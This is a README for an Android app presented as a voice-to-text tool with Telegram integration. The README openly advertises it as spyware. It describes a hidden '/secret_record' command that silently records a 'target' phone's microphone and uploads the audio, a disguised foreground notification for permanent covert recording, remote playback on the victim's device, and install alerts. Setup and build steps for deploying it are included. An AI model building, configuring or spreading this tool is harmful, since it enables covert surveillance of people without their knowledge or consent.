<!-- Banner -->
<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0088cc&height=200&section=header&text=VoiceToText%20App&fontSize=50&fontColor=ffffff&animation=fadeIn&fontAlignY=35" alt="Header Banner">
</p>

<h1 align="center">🎙️ VoiceToText Telegram Remote App 🚀</h1>

<p align="center">
  <em>A next-generation Android application offering seamless Voice-to-Text conversion, covert remote microphone recording, and instant Telegram bot integration.</em>
</p>

<p align="center">
  <a href="https://kotlinlang.org"><img src="https://img.shields.io/badge/Kotlin-1.9.0-B125EA?style=for-the-badge&logo=kotlin&logoColor=white" alt="Kotlin"></a>
  <a href="https://developer.android.com/"><img src="https://img.shields.io/badge/Android-3DDC84?style=for-the-badge&logo=android&logoColor=white" alt="Android"></a>
  <a href="https://core.telegram.org/bots/api"><img src="https://img.shields.io/badge/Telegram_API-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram API"></a>
  <a href="https://gradle.org/"><img src="https://img.shields.io/badge/Gradle-02303A?style=for-the-badge&logo=gradle&logoColor=white" alt="Gradle"></a>
</p>

---

## 📑 Table of Contents
- [✨ Key Features](#-key-features)
- [🤖 Telegram Commands](#-telegram-commands)
- [⚙️ Setup & Configuration](#️-setup--configuration)
- [🚀 How to Compile](#-how-to-compile)
- [📸 Screenshots](#-screenshots)

---

## ✨ Key Features

| Feature | Description |
| :--- | :--- |
| 📝 **Smart Transcription** | Automatically transcribes user voice logs and forwards them to your Telegram chat instantly. |
| 🎧 **Remote Voice Playback** | Reply to the bot's log on Telegram with a Voice Note, and it will **auto-play** out loud on the user's Android phone! |
| 🕵️ **Secret Microphone Access** | Trigger a silent background audio recording remotely via a hidden Telegram command. |
| 🌍 **On-the-fly Translation** | Integrated Google Translate API allows seamless language translation within the app before sending. |
| 🔔 **Live Alerts** | Get real-time pings in your Telegram chat the moment a new user installs and registers. |
| 🛡️ **Always-On Background Mode** | Uses a disguised Foreground Service notification to ensure permanent background microphone privileges, allowing secret recording even when the app is swiped away! |

> [!TIP]
> **Pro-Tip**: You can add your bot to a Telegram Group and add multiple Chat IDs to broadcast logs to your entire team!

---

## 🤖 Telegram Commands

Control the Android device directly from your Telegram Chat! Send these messages to your bot:

### 1. The Stealth Mode: `/secret_record`
Force the Android device to silently record ambient audio in the background and upload it directly to you.

```bash
# Syntax:
/secret_record <TargetUsername> <DurationInSeconds>

# Example:
/secret_record JohnDoe 15
```
*(This command covertly records John's microphone for 15 seconds and sends the `.m4a` file to the chat.)*

### 2. The Loudspeaker: 🎤 Voice Reply
1. Find a voice log message sent by the bot.
2. Swipe left to **Reply**.
3. Record and send a Voice Message.
4. The bot downloads your voice and plays it **out loud** on the target Android device immediately.

---

## ⚙️ Setup & Configuration

You need to inject your own Telegram Bot Token and Chat IDs before compiling. 

<details>
<summary><b>👉 Click here for Step-by-Step Instructions</b></summary>

### Step 1: Get Credentials
1. Message [@BotFather](https://t.me/botfather) on Telegram and send `/newbot` to create your bot. Copy the **HTTP API Token**.
2. Message [@userinfobot](https://t.me/userinfobot) to get your personal **Chat ID** (or add the bot to a group and get the group ID).

### Step 2: Edit the Source Code
Navigate to [`app/src/main/java/com/voicetotextapp/TelegramApi.kt`](app/src/main/java/com/voicetotextapp/TelegramApi.kt) and replace the placeholders:

```kotlin
object TelegramApi {
    // 🔴 1. PASTE YOUR BOT TOKEN HERE
    private const val BOT_TOKEN = "YOUR_BOT_TOKEN_HERE" 
    
    // 🔴 2. PASTE YOUR CHAT IDs HERE (Comma separated)
    private val CHAT_IDS = listOf("123456789", "987654321") 
    ...
}
```
</details>

---

## 🚀 How to Compile

> [!IMPORTANT]
> Make sure you have **JDK 17+** and **Android SDK** installed before compiling.

### 💻 Using Terminal / Command Line
Navigate to the root directory of the project and run:

```bash
# Give execution permission to Gradle (Mac/Linux)
chmod +x gradlew

# Build a clean Debug APK
./gradlew clean assembleDebug
```
✅ **Success!** Your APK will be generated at:
`app/build/outputs/apk/debug/app-debug.apk`

### 🎨 Using Android Studio
1. Launch **Android Studio** -> `Open`.
2. Select the `VoiceToTextApp` folder.
3. Wait for the Gradle Sync to complete.
4. Click the green ▶️ **Run** button on the top toolbar!

---

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0088cc&height=100&section=footer" alt="Footer Banner">
</p>
